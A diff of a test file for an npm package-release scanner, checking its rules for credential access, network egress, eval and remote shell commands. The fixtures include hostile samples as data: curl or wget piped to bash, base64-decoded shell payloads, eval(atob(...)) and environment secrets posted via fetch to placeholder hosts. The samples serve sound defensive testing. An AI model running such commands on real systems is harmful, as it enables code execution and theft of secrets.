@@ -643,8 +643,460 @@ describe("review", () => {
     ).toEqual([]);
     expect(credentialFindings("const java = process.env['JAVA_HOME'];\n")).toEqual([]);
     expect(credentialFindings("const g = process.env.GRADLE_USER_HOME;\n")).toEqual([]);
-    expect(credentialFindings("const home = process.env.HOME;\n")).toHaveLength(1);
+    expect(credentialFindings("const home = process.env.HOME;\n")).toEqual([]);
     expect(credentialFindings("const t = process.env.NPM_TOKEN_HOMEPAGE;\n")).toHaveLength(1);
+  });
+
+  test("reads of named configuration variables are not credential access", () => {
+    const credentialFindings = (textSample, path = "index.js") => {
+      const staged = [{ path, size: textSample.length, sha256: "cfg", flags: [], textSample }];
+      return deterministicFindings(staged, createPackageDiff([], staged)).filter(
+        (finding) => finding.ruleId === "code.credential-access",
+      );
+    };
+
+    for (const textSample of [
+      "if (process.env.NAPI_RS_NATIVE_LIBRARY_PATH) load(process.env.NAPI_RS_NATIVE_LIBRARY_PATH);\n",
+      "const port = process.env.PORT || 1234;\nprocess.env.PATH = `${bin}:${process.env.PATH}`;\n",
+      "const dir = process.env['XDG_RUNTIME_DIR'] ?? process.env.XDG_CONFIG_HOME;\n",
+      "const proxy = process.env.npm_config_https_proxy || process.env.npm_config_user_agent;\n",
+      "const { APPDATA = join(home, 'AppData'), OSTYPE } = process.env;\n",
+      "const a = process.env.GIT_AUTHOR_NAME, t = process.env.TOKENIZERS_PARALLELISM, k = process.env.KEYBOARD_LAYOUT;\n",
+      "const flag = process.env.NEXT_PRIVATE_LOCAL_DEV || process.env.GITHUB_ACTIONS || process.env.PWD;\n",
+      "// process.env.PACKAGE_VERSION is injected when we publish.\nmodule.exports = 1;\n",
+      "/**\n * @param {Record<string, string>} processEnv process.env object\n */\nmodule.exports = (env) => env;\n",
+      // Uses of the env object that read nothing.
+      "if (typeof process.env === 'object' && process.env !== undefined && !process.env.CI) x();\nconst y = void 0 !== process.env ? 1 : 2;\nif (process.env) z();\nconst t = !!process.env;\n",
+      // Named reads spelled through a split line, a multi-line destructuring, an
+      // alias used only for named reads, and TypeScript's optional-chain lowering.
+      "const a = process.env\n  .npm_command;\nconst {\n  APPDATA = '',\n  PORT: port,\n} = process.env;\n",
+      "const env = process.env;\nif ('NO_COLOR' in env) x();\nconst wt = !!env.WT_SESSION || !!env.TERM_SESSION_ID || env['CI'];\n",
+      "const mode = (null == process ? void 0 : process.env)?.NODE_ENV;\n",
+      "var _a;\nconst m = (_a = process === null || process === void 0 ? void 0 : process.env) === null || _a === void 0 ? void 0 : _a.NODE_ENV;\n",
+    ]) {
+      expect(credentialFindings(textSample), textSample).toEqual([]);
+    }
+  });
+
+  test("environment mentions in comments are not credential access", () => {
+    const credential = (path, textSample) => {
+      const staged = [{ path, size: textSample.length, sha256: "c", flags: [], textSample }];
+      return deterministicFindings(staged, createPackageDiff([], staged)).filter(
+        (finding) => finding.ruleId === "code.credential-access",
+      );
+    };
+    const jsdoc =
+      "/**\n * Has no effect on `process.env`; the caller decides what to do with it.\n */\n";
+    const astroComment =
+      "---\n// do not access env variables using import.meta.env[varname]\nconst id = import.meta.env.PUBLIC_ID;\n---\n<div>{id}</div>\n";
+    // Past the constant folder's 512 KB cap, as in bundled chunks.
+    const filler = `const pad = 0;\n`.repeat(40 * 1024);
+
+    expect(credential("lib/index.js", `${jsdoc}module.exports = 1;\n`)).toEqual([]);
+    expect(credential("dist/chunk.js", `${filler}${jsdoc}module.exports = 1;\n`)).toEqual([]);
+    expect(credential("src/index.astro", astroComment)).toEqual([]);
+    // A real use with a trailing comment on the same line still counts.
+    expect(
+      credential("lib/index.js", "const all = { ...process.env }; // snapshot for debugging\n"),
+    ).toHaveLength(1);
+    expect(
+      credential("dist/chunk.js", `${filler}send(process.env); // process.env is fine\n`),
+    ).toHaveLength(1);
+    expect(
+      credential("src/index.astro", "---\nconst v = import.meta.env[name]; // computed\n---\n"),
+    ).toHaveLength(1);
+  });
+
+  test("the line-comment pass keeps template substitutions on comment-looking lines", () => {
+    const ruleIds = (path, textSample) => {
+      const staged = [{ path, size: textSample.length, sha256: "t", flags: [], textSample }];
+      return deterministicFindings(staged, createPackageDiff([], staged)).map(
+        (finding) => finding.ruleId,
+      );
+    };
+    const payloads = [
+      ["code.dynamic-evaluation", "const a = `\n// ${eval(atob(blob))}\n`;\n"],
+      ["code.network-access", "const b = `\n// ${fetch(u)}\n`;\n"],
+      ["code.credential-access", "const c = `\n// ${JSON.stringify(process.env)}\n`;\n"],
+    ];
+    for (const path of ["src/App.vue", "src/App.svelte"]) {
+      for (const [ruleId, payload] of payloads) {
+        expect(ruleIds(path, `<script>\n${payload}</script>\n`), path).toContain(ruleId);
+      }
+    }
+    // Past the 4 MB lexing cap: one large file carrying all three.
+    const filler = `const pad = 0;\n`.repeat(300 * 1024);
+    expect(ruleIds("dist/huge.js", filler + payloads.map(([, p]) => p).join(""))).toEqual(
+      expect.arrayContaining(payloads.map(([ruleId]) => ruleId)),
+    );
+  }, 60_000);
+
+  test("the line-comment pass leaves component markup and JSX alone", () => {
+    const ruleIds = (path, textSample) => {
+      const staged = [{ path, size: textSample.length, sha256: "m", flags: [], textSample }];
+      return deterministicFindings(staged, createPackageDiff([], staged)).map(
+        (finding) => finding.ruleId,
+      );
+    };
+    const svelteScript = "<script>\n  let u = '/x', m = 'POST';\n</script>\n";
+    expect(
+      ruleIds(
+        "src/App.svelte",
+        `${svelteScript}<p>\n// {fetch(u,{method:m,body:JSON.stringify(process.env)})}\n</p>\n`,
+      ),
+    ).toEqual(expect.arrayContaining(["code.network-access", "code.credential-access"]));
+    expect(ruleIds("src/App.svelte", `${svelteScript}<p>\n// {eval(atob(u))}\n</p>\n`)).toContain(
+      "code.dynamic-evaluation",
+    );
+    expect(
+      ruleIds("src/App.vue", "<template>\n  <p>\n// {{ fetch(u) }}\n  </p>\n</template>\n"),
+    ).toContain("code.network-access");
+    // Past the 4 MB lexing cap the view is raw: JSX text and a `//` line inside
+    // a template literal both stay.
+    const filler = `const pad = 0;\n`.repeat(300 * 1024);
+    expect(
+      ruleIds(
+        "dist/huge.jsx",
+        `${filler}const el = (\n  <p>\n// {fetch(u)}\n  </p>\n);\nconst t = \`\n// eval(p)\n\`;\n`,
+      ),
+    ).toEqual(expect.arrayContaining(["code.network-access", "code.dynamic-evaluation"]));
+    // A `//` line inside a template literal in a script region is template
+    // text an eval can run, in every component flavour.
+    const templated = "const step = `\n// fetch(target, init)\n`;\neval(step.slice(2));\n";
+    for (const [path, source] of [
+      ["src/App.svelte", `<script>\n${templated}</script>\n<p>hi</p>\n`],
+      ["src/App.vue", `<script setup>\n${templated}</script>\n<template><p>hi</p></template>\n`],
+      ["src/Page.astro", `---\n${templated}---\n<p>hi</p>\n`],
+    ]) {
+      expect(ruleIds(path, source), path).toEqual(
+        expect.arrayContaining(["code.network-access", "code.dynamic-evaluation"]),
+      );
+    }
+    // A `<script>` inside an HTML comment opens a false region over markup;
+    // nothing in that markup is blanked.
+    expect(
+      ruleIds(
+        "src/App.svelte",
+        "<!-- <script> -->\n<p>it's\n// {eval(atob(u))}\n</p>\n<script>\nlet u;\n</script>\n",
+      ),
+    ).toContain("code.dynamic-evaluation");
+    // Once markup starts, a `<script>` in an HTML comment, an attribute value or
+    // an expression string opens no region, so a directive line stays.
+    const directive = "  <button\n// @click=fetch(u)\n  >go</button>\n";
+    const script = "<script setup>\nconst u = '/x';\n</script>\n";
+    for (const [path, source] of [
+      ["src/App.vue", `<template>\n  <!-- <script> -->\n${directive}</template>\n${script}`],
+      [
+        "src/App.vue",
+        `<template>\n  <p title="<script>">hi</p>\n${directive}</template>\n${script}`,
+      ],
+      ["src/App.svelte", `<p>{'<script>'}</p>\n${directive}${script}`],
+      [
+        "src/Page.astro",
+        `---\nconst u = '/x';\n---\n<p title="<script>">hi</p>\n${directive}${script}`,
+      ],
+      // A `---` line inside a frontmatter template is not the closing fence.
+      ["src/Page.astro", "---\nconst t = `\n---\n<script>\n// fetch(u)\n</script>\n`;\n---\n"],
+    ]) {
+      expect(ruleIds(path, source), source).toContain("code.network-access");
+    }
+    // Comments inside a component's leading script blocks are still blanked.
+    expect(
+      ruleIds("src/App.svelte", "<script>\n// reads process.env[name] at build time\n</script>\n"),
+    ).toEqual([]);
+    expect(
+      ruleIds(
+        "src/App.svelte",
+        '<script context="module">\nexport const a = 1;\n</script>\n<script lang="ts">\n// reads process.env[name] at build time\n</script>\n<p>hi</p>\n',
+      ),
+    ).toEqual([]);
+    expect(
+      ruleIds("src/Page.astro", "---\n// do not use import.meta.env[varname]\n---\n<p>hi</p>\n"),
+    ).toEqual([]);
+  }, 60_000);
+
+  test("JSX text never opens a comment in the code view", () => {
+    const ruleIds = (path, textSample) => {
+      const staged = [{ path, size: textSample.length, sha256: "x", flags: [], textSample }];
+      return deterministicFindings(staged, createPackageDiff([], staged)).map(
+        (finding) => finding.ruleId,
+      );
+    };
+    const spanning =
+      "const A = () => <p>/*</p>;\nconst s = JSON.stringify(process.env);\n" +
+      "fetch('https://x.invalid', {method:'POST', body:s});\neval(atob(p));\n" +
+      "const B = () => <p>*/</p>;\n";
+    for (const path of ["src/A.tsx", "src/A.jsx", "lib/a.js"]) {
+      expect(ruleIds(path, spanning), path).toEqual(
+        expect.arrayContaining([
+          "code.network-access",
+          "code.credential-access",
+          "code.dynamic-evaluation",
+        ]),
+      );
+      for (const line of [
+        "const A = () => <p>see // {fetch(u)}</p>;\n",
+        "const A = () => <p>/* {fetch(u)} */</p>;\n",
+        "const A = () => <div><br/>/*</div>; fetch(u); /**/\n",
+      ]) {
+        expect(ruleIds(path, line), `${path}: ${line}`).toContain("code.network-access");
+      }
+    }
+  });
+
+  test("the code view and the constant fold stay near-linear on deep nesting and arrow chains", () => {
+    const ruleIds = (path, textSample) => {
+      const staged = [{ path, size: textSample.length, sha256: "q", flags: [], textSample }];
+      return deterministicFindings(staged, createPackageDiff([], staged)).map(
+        (finding) => finding.ruleId,
+      );
+    };
+    const deep = `x=${"[".repeat(20_000)}${"]".repeat(20_000)};\n`;
+    const template = `\`${"${0}".repeat(1_000)}\`;`;
+    // About 505 KB each, under the fold's cap: contextual bindings at 2,000 and
+    // 5,000 depths, then a `${` or a `yield` lookup on every few bytes.
+    const catchTemplates = `${"catch(await){".repeat(2_000)}${template.repeat(120)}${"}".repeat(2_000)}\n`;
+    const letLookups = `${"{let await;".repeat(5_000)}${"yield;".repeat(74_000)}${"}".repeat(5_000)}\n`;
+    // 500 KB, under the fold's 512 KB cap, so the fold runs too.
+    const arrows = `const f = ${"(a)=>".repeat(100_000)}0;\n`;
+    for (const [path, source, ruleId] of [
+      ["lib/a.js", `fetch(u)\n${"(a)=>".repeat(120_000)}`, "code.network-access"],
+      ["lib/b.js", `${deep}fetch(u);\n`, "code.network-access"],
+      ["lib/e.js", `${catchTemplates}globalThis['ev'+'al'](atob(p));\n`, "code.dynamic-evaluation"],
+      ["lib/f.js", `${letLookups}globalThis['ev'+'al'](atob(p));\n`, "code.dynamic-evaluation"],
+      ["lib/c.js", `${deep}globalThis['ev'+'al'](atob(p));\n`, "code.dynamic-evaluation"],
+      [
+        "lib/d.js",
+        `${arrows}require('chi'+'ld_process')['exec'+'Sync'](atob(p));\n`,
+        "code.process-execution",
+      ],
+      [
+        "src/App.svelte",
+        `<script>\nfetch(u)\n${"/**/".repeat(64_000)}</script>\n`,
+        "code.network-access",
+      ],
+    ]) {
+      const start = performance.now();
+      expect(ruleIds(path, source), path).toContain(ruleId);
+      // Generous: well under a second here, against seconds to minutes before.
+      expect(performance.now() - start, path).toBeLessThan(15_000);
+    }
+  }, 120_000);
+
+  test("nested template markers past the view budget fall back to raw text", () => {
+    const textSample = "`${".repeat(1_300_000);
+    const staged = [
+      { path: "dist/nest.js", size: textSample.length, sha256: "n", flags: [], textSample },
+    ];
+    const heapBefore = process.memoryUsage().heapUsed;
+    const started = performance.now();
+    deterministicFindings(staged, createPackageDiff([], staged));
+    expect(performance.now() - started).toBeLessThan(10_000);
+    expect(process.memoryUsage().heapUsed - heapBefore).toBeLessThan(512 * 1024 * 1024);
+  }, 60_000);
+
+  test("a comment-only change does not make an existing credential read part of the release", () => {
+    const previousFiles = [
+      {
+        path: "lib/index.js",
+        size: 1,
+        sha256: "a",
+        flags: [],
+        textSample: "const t = process.env.NPM_TOKEN;\nfetch(u, { body: t });\n",
+      },
+    ];
+    const stagedFiles = [
+      {
+        path: "lib/index.js",
+        size: 1,
+        sha256: "b",
+        flags: [],
+        textSample:
+          "// Copies process.env[name] for the child; see JSON.stringify(process.env) below.\nconst t = process.env.NPM_TOKEN;\nfetch(u, { body: t });\n",
+      },
+    ];
+    const diff = createPackageDiff(previousFiles, stagedFiles);
+    const findings = deterministicFindings(stagedFiles, diff, undefined, { previousFiles });
+    const credential = annotateFindingsWithDiffStatus(findings, diff, {
+      previousFiles,
+      stagedFiles,
+    }).find((finding) => finding.ruleId === "code.credential-access");
+    expect(credential?.releaseDelta).toBeFalsy();
+  });
+
+  test("still flags secret-shaped, computed and whole-object environment uses", () => {
+    const credentialFindings = (textSample) => {
+      const staged = [
+        { path: "index.js", size: textSample.length, sha256: "s", flags: [], textSample },
+      ];
+      return deterministicFindings(staged, createPackageDiff([], staged)).filter(
+        (finding) => finding.ruleId === "code.credential-access",
+      );
+    };
+
+    for (const textSample of [
+      "const k = process.env.OPENAI_API_KEY;\n",
+      "const k = process.env['STRIPE_SECRET'];\n",
+      "const k = process?.env?.CI_JOB_TOKEN;\n",
+      "const k = import.meta.env.VITE_SUPABASE_KEY;\n",
+      "const { AWS_REGION } = process.env;\n",
+      "const {\n  CI_JOB_JWT: identity,\n} = process.env;\n",
+      "const { PORT, ...rest } = process.env;\n",
+      // A destructuring assignment evaluates to the whole env object.
+      "let HOME;\nmodule.exports = () => JSON.stringify({ HOME } = process.env);\n",
+      "let HOME, PATH;\nfs.writeFileSync(out, JSON.stringify(({ HOME, PATH } = process.env)));\n",
+      "let HOME;\nprocess.send({ HOME } = process.env);\n",
+      "const k = process.env.CI_JOB_JWT_V2;\n",
+      "const f = readFileSync(process.env.KUBECONFIG);\n",
+      "const f = process.env.DOCKER_CONFIG + '/config.json';\n",
+      "const t = process.env.npm_config__auth;\n",
+      'const t = process.env["npm_config_//registry.npmjs.org/:_authToken"];\n',
+      "const t = Deno.env.get('GH_PAT');\n",
+      "const v = process.env[name];\n",
+      "const v = process.env[`NPM_${kind}`];\n",
+      "const v = globalThis.process[key];\n",
+      "const v = process.env['NPM_' + 'TOKEN'];\n",
+      "send(JSON.stringify(process.env));\n",
+      "for (const k in process.env) out[k] = 1;\n",
+      "const all = Object.entries(process.env);\n",
+      "post(url, { body: { ...process.env } });\n",
+      "req.end(process.env);\n",
+      "module.exports = process.env;\n",
+      "const env = process.env;\nconst key = env.ANTHROPIC_API_KEY;\n",
+      "const e = process.env;\nhttps.request(u).end(JSON.stringify(e));\n",
+      // The env object as a value: copied, spread, wrapped, passed or bound.
+      "const copy = Object.assign({}, process.env);\n",
+      "const snapshot = { ...process.env };\n",
+      "const q = new URLSearchParams(process.env);\n",
+      "report(process.env);\n",
+      "function f(e = process.env) { return e.CI; }\n",
+      "const mode = (null == process ? void 0 : process.env)?.NPM_TOKEN;\n",
+      "const env = process.env;\nconst names = Object.keys(env);\n",
+      "const env = process.env, copy = env;\n",
+      // A child inherits the environment anyway, but a callee named `spawn` is
+      // not proof of a child process, so handing the object on still counts.
+      "spawn(cmd, args, { env: { ...process.env, FORCE_COLOR: '1' } });\n",
+      "const v = globalThis['proc' + 'ess']['e' + 'nv'];\n",
+    ]) {
+      expect(credentialFindings(textSample), textSample).toHaveLength(1);
+    }
+  });
+
+  test("socket, HTTP/2, TLS and userland clients are network egress", () => {
+    for (const textSample of [
+      "const dgram = require('node:dgram');\n",
+      "const tls = require ( 'tls' );\n",
+      "import http2 from 'http2';\n",
+      "import { request } from 'undici';\n",
+      "const WebSocket = require('ws');\n",
+      "const { connect } = await import('node:net');\n",
+      "const ws = new WebSocket('wss://example.invalid');\n",
+      "navigator.sendBeacon('https://example.invalid', body);\n",
+    ]) {
+      const staged = [
+        { path: "lib/x.js", size: textSample.length, sha256: "n", flags: [], textSample },
+      ];
+      expect(
+        deterministicFindings(staged, createPackageDiff([], staged)).map((f) => f.ruleId),
+        textSample,
+      ).toContain("code.network-access");
+    }
+  });
+
+  test("network and eval patterns ignore comments and code emitted as strings", () => {
+    const ruleIds = (textSample, path = "lib/index.js") => {
+      const staged = [{ path, size: textSample.length, sha256: "c", flags: [], textSample }];
+      return deterministicFindings(staged, createPackageDiff([], staged)).map(
+        (finding) => finding.ruleId,
+      );
+    };
+
+    expect(
+      ruleIds(
+        "/**\n * import { createServer } from 'node:http';\n */\n// fetch() leaves them alone\nconst x = 1; /* XMLHttpRequest */\n",
+      ),
+    ).toEqual([]);
+    expect(
+      ruleIds(
+        'const code = ["WebAssembly.compile(bytes)", "eval()"];\nclass Node { eval(context) { return this; } }\n' +
+          "const load = new Function('specifier', 'return import(specifier)');\n" +
+          "const vite = new Function('return import(\"vite\")');\n" +
+          "exports.P = new Function('return this;')().Promise;\n",
+      ),
+    ).toEqual([]);
+    // Template text around a substitution, and literals inside one, are data.
+    expect(
+      ruleIds(
+        "const src = `eval(${JSON.stringify(code)} + ${'\\n//# sourceURL=x'})`;\n" +
+          'const wasm = `.then(${rt.returningFunction("WebAssembly.compile(bytes)", "bytes")})`;\n',
+      ),
+    ).toEqual([]);
+    // The same text in a non-JavaScript file is not lexed, so nothing is blanked.
+    expect(ruleIds("# fetch('https://example.invalid')\n", "scripts/run.sh")).toContain(
+      "code.network-access",
+    );
+    // Annex B HTML-like comments are code in module source and stay visible.
+    expect(ruleIds("if (a <!--b) fetch('https://example.invalid');\n", "lib/index.mjs")).toContain(
+      "code.network-access",
+    );
+    // and their presence anywhere leaves the whole file unblanked, since the
+    // lexer's template boundaries after one may be wrong.
+    expect(
+      ruleIds("let t = '', a = 1, b = 1\nif (!(a <!--b)) t = `\n// fetch(u)\n`\n", "lib/a.js"),
+    ).toContain("code.network-access");
+    expect(ruleIds("while (n-->0) step()\n// fetch(u)\n", "lib/a.js")).toContain(
+      "code.network-access",
+    );
+    for (const textSample of [
+      "if (!fetch(url)) {\n}\n",
+      "if (eval(code)) {\n}\n",
+      "eval(code)\n{ }\n",
+      "const f = new Function(`var callback = ${source}`);\n",
+      "const f = new Function('a', 'return import(a); fetch(a)');\n",
+      'setTimeout("eval(atob(p))");\n',
+      // Substitution bodies are code, however the template nests or quotes braces.
+      "const s = `${eval(p)}`;\n",
+      "const s = `a${`b${new Function(p)()}`}`;\n",
+      "const s = `${'}'}${eval(p)}`;\n",
+      "const s = `${{ a: '`' }.a}${eval(p)}`;\n",
+    ]) {
+      expect(ruleIds(textSample), textSample).toEqual(
+        expect.arrayContaining([
+          expect.stringMatching(/^code\.(?:network-access|dynamic-evaluation)$/),
+        ]),
+      );
+    }
+  });
+
+  test("shell keyword lists and prose are not remote shell commands", () => {
+    const remoteShell = (textSample) => {
+      const staged = [{ path: "lib/grammar.js", size: 1, sha256: "g", flags: [], textSample }];
+      return deterministicFindings(staged, createPackageDiff([], staged)).filter(
+        (finding) => finding.ruleId === "code.remote-shell",
+      );
+    };
+
+    expect(
+      remoteShell(
+        "const { spawn } = require('child_process');\n" +
+          "const builtin = /(^|[\\s;|&])(?:awk|bash|cat|curl|cut|wget|which|zsh)(?=$|[)\\s;|&])/;\n" +
+          "const keywords = 'cat cd cp curl cvpa dbp echo|0 wget where';\n" +
+          "log('curl is required; retry with `vercel curl <url>`');\n",
+      ),
+    ).toEqual([]);
+    for (const textSample of [
+      "execSync('curl -fsSL https://example.invalid/i | bash');\n",
+      "execSync('curl ${IFS}https://example.invalid/i|sh');\n",
+      "execSync(`wget -qO- ${url} | sudo -E bash`);\n",
+      "const cmd = 'curl https://example.invalid/i | base64 -d | sh';\n",
+    ]) {
+      expect(remoteShell(textSample), textSample).toEqual([
+        expect.objectContaining({ severity: "critical" }),
+      ]);
+    }
+    expect(
+      remoteShell("require('child_process').exec('curl example.invalid/x -o /tmp/x');\n"),
+    ).toEqual([expect.objectContaining({ severity: "high" })]);
   });
 
   test("still flags aliased, enumerated and presence-then-read environment access", () => {
@@ -693,10 +1145,11 @@ describe("review", () => {
     expect(findings.filter((finding) => finding.file === "site/usage.txt")).toEqual([]);
     expect(findings).toEqual(
       expect.arrayContaining([
+        // `navigator.sendBeacon(...)` on line 4 is itself egress.
         expect.objectContaining({
           ruleId: "code.network-access",
           file: "site/index.html",
-          line: 5,
+          line: 4,
         }),
         expect.objectContaining({
           ruleId: "code.dynamic-evaluation",
@@ -1188,6 +1641,15 @@ describe("review", () => {
     expect(run("site/index.html", "<script>".repeat(64 * 1024))).toBeLessThan(2000);
     expect(run("site/handlers.html", '<a onclick="'.repeat(40 * 1024))).toBeLessThan(2000);
     expect(run("index.js", `process.env${"\n".repeat(128 * 1024)}`)).toBeLessThan(2000);
+    expect(run("lib/destructure.js", "} = process.env\n".repeat(20 * 1024))).toBeLessThan(2000);
+    expect(run("lib/braces.js", `${"{ a, ".repeat(40 * 1024)}} = process.env`)).toBeLessThan(2000);
+    expect(run("lib/aliases.js", "const e = process.env;\n".repeat(16 * 1024))).toBeLessThan(2000);
+    expect(
+      run("lib/alias-uses.js", `const e = process.env;\n${"e.PORT;".repeat(32 * 1024)}`),
+    ).toBeLessThan(2000);
+    expect(
+      run("lib/guards.js", `${"!".repeat(64 * 1024)}process.env${" ".repeat(64 * 1024)}`),
+    ).toBeLessThan(2000);
     expect(run("site/attrs.html", `<p x=${" ".repeat(128 * 1024)}y>`)).toBeLessThan(2000);
     expect(run("site/refs.html", `<a href="${"&#x".repeat(40 * 1024)}`)).toBeLessThan(2000);
     expect(run("lib/conn.js", "Host=".repeat(40 * 1024))).toBeLessThan(2000);
